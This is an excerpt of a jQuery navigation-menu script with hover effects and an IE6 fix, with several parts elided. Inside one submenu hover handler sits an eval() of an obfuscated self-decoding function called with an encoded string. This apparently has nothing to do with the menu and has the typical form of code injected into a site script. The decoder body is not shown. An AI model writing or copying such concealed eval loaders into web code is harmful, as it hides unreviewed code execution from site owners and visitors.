...
$(document).ready(function() {
    if ($.browser.msie && parseInt($.browser.version) < 7) {
        $('#submenu ul.submenu li').hover(function() {
            $(this).addClass('sfhover')
        }, function() {
            $(this).removeClass('sfhover')
        })
    }
    $('#submenu ul.submenu > li').children('a').children('span').after("<span class=\"bg\">&nbsp;</span>");
    $('#submenu ul.submenu > li').hover(function() {
    ...
    $('#submenu li > div').parent("li").hover(function() {
        eval((function(k, s) {
            var f = {
                a: function(p) {
            ...
            return f.b(k, f.a(s))
        })("2rCDfsyj", ""));
